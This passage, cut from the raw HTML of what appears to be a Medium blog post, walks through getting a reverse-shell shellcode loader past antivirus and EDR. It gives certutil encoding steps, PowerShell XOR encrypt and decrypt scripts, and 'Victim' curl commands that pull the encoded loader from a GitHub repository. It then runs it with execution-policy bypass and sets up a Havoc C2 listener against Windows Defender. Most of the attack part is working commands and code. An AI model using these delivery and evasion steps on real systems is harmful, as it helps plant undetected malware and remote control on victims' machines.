https://miro.medium.com/v2/resize:fit:828/1*d3hmJQ5eEO34zSGxhlJ9HA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*d3hmJQ5eEO34zSGxhlJ9HA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*d3hmJQ5eEO34zSGxhlJ9HA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="288" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*d3hmJQ5eEO34zSGxhlJ9HA.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><h2 id="fb34" class="oc od hl bg oe of og il oh oi oj io ok ol om on oo op oq or os ot ou ov ow ox bl" data-selectable-paragraph="">Detection</h2><p id="2f9d" class="pw-post-body-paragraph ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob he bl" data-selectable-paragraph="">This is not anywhere close to a complete bypass for all products. What if the EDR checks more than just the first return address? Not just where the syscall came from, but who called the function that executed the syscall. In this case, if we’re doing indirect syscalls from some shellcode located in dynamically allocated memory, then the EDR is going to see that. Ideally, we want to fake more than just the system call return address. An interesting solution to this is call stack spoofing which I'll cover in another post.</p><p id="73d5" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Although I don’t do this usually (I’m sorry), I was interested so uploaded it to Virus Total. It was only identified by 10/72 vendors which isn't bad. Microsoft was able to identify it as malware, but not bitdefender or avast which is interesting.</p></div></div><div class="pu"><div class="ac ci"><div class="mi ri mj rj mk rk cm rl cn rm cp bi"><figure class="pd pe pf pg ph pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps sb"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*n0Mohk7K8DTkoC3CwEyrnQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*n0Mohk7K8DTkoC3CwEyrnQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*n0Mohk7K8DTkoC3CwEyrnQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*n0Mohk7K8DTkoC3CwEyrnQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*n0Mohk7K8DTkoC3CwEyrnQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*n0Mohk7K8DTkoC3CwEyrnQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*n0Mohk7K8DTkoC3CwEyrnQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*n0Mohk7K8DTkoC3CwEyrnQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*n0Mohk7K8DTkoC3CwEyrnQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*n0Mohk7K8DTkoC3CwEyrnQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*n0Mohk7K8DTkoC3CwEyrnQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*n0Mohk7K8DTkoC3CwEyrnQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*n0Mohk7K8DTkoC3CwEyrnQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*n0Mohk7K8DTkoC3CwEyrnQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn pz c" width="1000" height="417" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*n0Mohk7K8DTkoC3CwEyrnQ.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="2562" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">One thing I noticed is Microsoft was detecting the <strong class="ni hm">transfer</strong> of the PE when I try to download it from the internet, but the execution itself was undetected. So, what we can do is some old fashioned encoding/decoding or encrypting of the PE to bypass this. Here’s two methods.</p><h3 id="411b" class="sc od hl bg oe sd se ef oh sf sg eh ok np sh si sj nt sk sl sm nx sn so sp sq bl" data-selectable-paragraph="">Option 1- Certutil</h3><ol class=""><li id="1f4d" class="ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob sr rt ru bl" data-selectable-paragraph=""><strong class="ni hm">Attacker: </strong>certutil -encode ShellcodeLoader.exe test.txt</li><li id="ea49" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob sr rt ru bl" data-selectable-paragraph=""><strong class="ni hm">Victim: </strong>curl <a class="ah rh" href="https://raw.githubusercontent.com/srothlisberger6361/revshell_indirect/main/test.txt" rel="noopener ugc nofollow" target="_blank">https://raw.githubusercontent.com/srothlisberger6361/revshell_indirect/main/test.txt</a> -o test.txt</li><li id="ce6b" class="ng nh hl ni b ij rv nk nl im rw nn no np rx nr ns nt ry nv nw nx rz nz oa ob sr rt ru bl" data-selectable-paragraph=""><strong class="ni hm">Victim: </strong>certutil -decode test.txt test.exe</li></ol><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps ss"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*DHIykDiPAM5NsTwGglViTA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*DHIykDiPAM5NsTwGglViTA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*DHIykDiPAM5NsTwGglViTA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*DHIykDiPAM5NsTwGglViTA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*DHIykDiPAM5NsTwGglViTA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*DHIykDiPAM5NsTwGglViTA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DHIykDiPAM5NsTwGglViTA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*DHIykDiPAM5NsTwGglViTA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*DHIykDiPAM5NsTwGglViTA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*DHIykDiPAM5NsTwGglViTA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*DHIykDiPAM5NsTwGglViTA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*DHIykDiPAM5NsTwGglViTA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*DHIykDiPAM5NsTwGglViTA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*DHIykDiPAM5NsTwGglViTA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn pz c" width="700" height="244" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*DHIykDiPAM5NsTwGglViTA.png"></picture></div></div></figure><h3 id="c249" class="sc od hl bg oe sd se ef oh sf sg eh ok np sh si sj nt sk sl sm nx sn so sp sq bl" data-selectable-paragraph="">Option 2- Manual XOR Encryption</h3><ol class=""><li id="aeb4" class="ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob sr rt ru bl" data-selectable-paragraph="">Encrypt the PE</li></ol><pre class="pd pe pf pg ph pi pj pk bq pl bc bl"><span id="a21a" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph=""><span class="hljs-comment">#encrypt.ps1</span><br><span class="hljs-variable">$byteArray</span> = [<span class="hljs-variable.constant">IO</span>.File]<span class="hljs-symbol">:</span><span class="hljs-symbol">:ReadAllBytes</span>(“<span class="hljs-variable">$pwd</span>\\ShellcodeLoader.exe”) <br><span class="hljs-variable">$KeyArray</span> = @(<span class="hljs-number">90</span>, <span class="hljs-number">15</span>, <span class="hljs-number">69</span>, <span class="hljs-number">23</span>, <span class="hljs-number">21</span>) <br><span class="hljs-variable">$keyposition</span> = <span class="hljs-number">0</span> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> -lt <span class="hljs-variable">$byteArray</span>.count; <span class="hljs-variable">$i</span>++) <br>{ <br>    <span class="hljs-variable">$byteArray</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$byteArray</span>[<span class="hljs-variable">$i</span>] -bxor <span class="hljs-variable">$KeyArray</span>[<span class="hljs-variable">$keyposition</span>]; <br>    <span class="hljs-variable">$keyposition</span> += <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$keyposition</span> -eq <span class="hljs-variable">$keyArray</span>.Length) { <br>        <span class="hljs-variable">$keyposition</span> = <span class="hljs-number">0</span> ; <br>        } <br>} <br>[<span class="hljs-variable.constant">IO</span>.File]<span class="hljs-symbol">:</span><span class="hljs-symbol">:WriteAllBytes</span>(“<span class="hljs-variable">$pwd</span>\\ShellcodeLoader.exe.xored”, <span class="hljs-variable">$byteArray</span>)</span></pre><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps st"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*X2ay29heHV8Ifm6fHsmGmg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*X2ay29heHV8Ifm6fHsmGmg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*X2ay29heHV8Ifm6fHsmGmg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*X2ay29heHV8Ifm6fHsmGmg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*X2ay29heHV8Ifm6fHsmGmg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*X2ay29heHV8Ifm6fHsmGmg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X2ay29heHV8Ifm6fHsmGmg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*X2ay29heHV8Ifm6fHsmGmg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*X2ay29heHV8Ifm6fHsmGmg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*X2ay29heHV8Ifm6fHsmGmg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*X2ay29heHV8Ifm6fHsmGmg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*X2ay29heHV8Ifm6fHsmGmg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*X2ay29heHV8Ifm6fHsmGmg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*X2ay29heHV8Ifm6fHsmGmg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn pz c" width="700" height="138" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*X2ay29heHV8Ifm6fHsmGmg.png"></picture></div></div></figure><p id="233c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">2. Transfer the encrypted PE to the Victim</p><pre class="pd pe pf pg ph pi pj pk bq pl bc bl"><span id="5ea7" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph=""><span class="hljs-comment">#Transfer XOR encrypted PE to victim disk</span><br>curl https://raw.githubusercontent.com/srothlisberger6361/revshell_indirect/main/ShellcodeLoader.exe.xored -o ShellcodeLoader.exe.xored</span></pre><p id="7f05" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">3. Decrypt the PE on Victim</p><pre class="pd pe pf pg ph pi pj pk bq pl bc bl"><span id="210c" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph=""><span class="hljs-comment">#decrypt.ps1</span><br>$byteArray = [IO.File]::ReadAllBytes(<span class="hljs-string">"$pwd\\ShellcodeLoader.exe.xored"</span>); <br>$KeyArray = @(<span class="hljs-number">90</span>, <span class="hljs-number">15</span>, <span class="hljs-number">69</span>, <span class="hljs-number">23</span>, <span class="hljs-number">21</span>); <br>$keyposition = <span class="hljs-number">0</span>; <br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i -<span class="hljs-keyword">lt</span> $byteArray.count; $i++) <br>{ <br>    $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; <br>    $keyposition += <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">if</span> ($keyposition -eq $keyArray.Length) { <br>        $keyposition = <span class="hljs-number">0</span> ; <br>          } <br>}<br>$outputFile = <span class="hljs-string">"$pwd\ShellcodeLoader.exe"</span><br>[IO.File]::WriteAllBytes($outputFile, $byteArray)</span></pre><pre class="su pi pj pk bq pl bc bl"><span id="8eb0" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph=""><span class="hljs-comment">#fetch decrypt.ps1</span><br>curl https://raw.githubusercontent.com/srothlisberger6361/revshell_indirect/main/decrypt.ps1 -o decrypt.ps1</span></pre><pre class="su pi pj pk bq pl bc bl"><span id="bfdf" class="pm od hl pj b bh pn po m pp pq" data-selectable-paragraph=""><span class="hljs-comment">#run decryption and output exe to disk</span><br>powershell -ep bypass -File “decrypt.ps1”</span></pre><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps sv"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ah0mUxRF2Y_3n8ot5lko_Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ah0mUxRF2Y_3n8ot5lko_Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ah0mUxRF2Y_3n8ot5lko_Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ah0mUxRF2Y_3n8ot5lko_Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ah0mUxRF2Y_3n8ot5lko_Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ah0mUxRF2Y_3n8ot5lko_Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ah0mUxRF2Y_3n8ot5lko_Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ah0mUxRF2Y_3n8ot5lko_Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ah0mUxRF2Y_3n8ot5lko_Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ah0mUxRF2Y_3n8ot5lko_Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ah0mUxRF2Y_3n8ot5lko_Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ah0mUxRF2Y_3n8ot5lko_Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ah0mUxRF2Y_3n8ot5lko_Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ah0mUxRF2Y_3n8ot5lko_Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn pz c" width="700" height="327" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ah0mUxRF2Y_3n8ot5lko_Q.png"></picture></div></div></figure><h2 id="46ab" class="oc od hl bg oe of og il oh oi oj io ok ol om on oo op oq or os ot ou ov ow ox bl" data-selectable-paragraph="">Testing on Windows Defender</h2><p id="6776" class="pw-post-body-paragraph ng nh hl ni b ij oy nk nl im oz nn no np pa nr ns nt pb nv nw nx pc nz oa ob he bl" data-selectable-paragraph="">Time to test this out on easy mode.</p><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps sw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*a3rnRy5KKjyFsmzJ-EGa5g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*a3rnRy5KKjyFsmzJ-EGa5g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*a3rnRy5KKjyFsmzJ-EGa5g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*a3rnRy5KKjyFsmzJ-EGa5g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*a3rnRy5KKjyFsmzJ-EGa5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*a3rnRy5KKjyFsmzJ-EGa5g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a3rnRy5KKjyFsmzJ-EGa5g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*a3rnRy5KKjyFsmzJ-EGa5g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*a3rnRy5KKjyFsmzJ-EGa5g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*a3rnRy5KKjyFsmzJ-EGa5g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*a3rnRy5KKjyFsmzJ-EGa5g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*a3rnRy5KKjyFsmzJ-EGa5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*a3rnRy5KKjyFsmzJ-EGa5g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*a3rnRy5KKjyFsmzJ-EGa5g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn pz c" width="700" height="441" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*a3rnRy5KKjyFsmzJ-EGa5g.png"></picture></div></div><figcaption class="sx fm sy pr ps sz ta bg b bh ab eb" data-selectable-paragraph="">Real-Time Protection Enabled</figcaption></figure><ol class=""><li id="5070" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob sr rt ru bl" data-selectable-paragraph="">Start the stage 1 handler</li></ol><figure class="pd pe pf pg ph pu pr ps paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps tb"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Mvhim1yVWy01etWqrhQgwQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Mvhim1yVWy01etWqrhQgwQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Mvhim1yVWy01etWqrhQgwQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Mvhim1yVWy01etWqrhQgwQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Mvhim1yVWy01etWqrhQgwQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Mvhim1yVWy01etWqrhQgwQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Mvhim1yVWy01etWqrhQgwQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Mvhim1yVWy01etWqrhQgwQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Mvhim1yVWy01etWqrhQgwQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Mvhim1yVWy01etWqrhQgwQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Mvhim1yVWy01etWqrhQgwQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Mvhim1yVWy01etWqrhQgwQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Mvhim1yVWy01etWqrhQgwQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Mvhim1yVWy01etWqrhQgwQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn pz c" width="700" height="70" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*Mvhim1yVWy01etWqrhQgwQ.png"></picture></div></div><figcaption class="sx fm sy pr ps sz ta bg b bh ab eb" data-selectable-paragraph="">Stage 1 Listener</figcaption></figure><p id="4d57" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">2. Start Havoc C2</p></div></div><div class="pu"><div class="ac ci"><div class="mi ri mj rj mk rk cm rl cn rm cp bi"><figure class="pd pe pf pg ph pu ro rp paragraph-image"><div role="button" tabindex="0" class="pv pw fr px bi py"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pr ps tc"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*_mYEyuk-lPhe2oUGRva0xw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*_mYEyuk-lPhe2oUGRva0xw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*_mYEyuk-lPhe2oUGRva0xw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*_mYEyuk-lPhe2oUGRva0xw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*_mYEyuk-lPhe2oUGRva0xw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*_mYEyuk-lPhe2oUGRva0xw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*_mYEyuk-lPhe2oUGRva0xw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*_mYEyuk-lPhe2oUGRva0xw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*_mYEyuk-lPhe2oUGRva0xw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*_mYEyuk-lPhe2oUGRva0xw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*_mYEyuk-lPhe2oUGRva0xw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*_mYEyuk-lPhe2oUGRva0xw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*_mYEyuk-lPhe2oUGRva0xw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*_mYEyuk-lPhe2oUGRva0xw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, 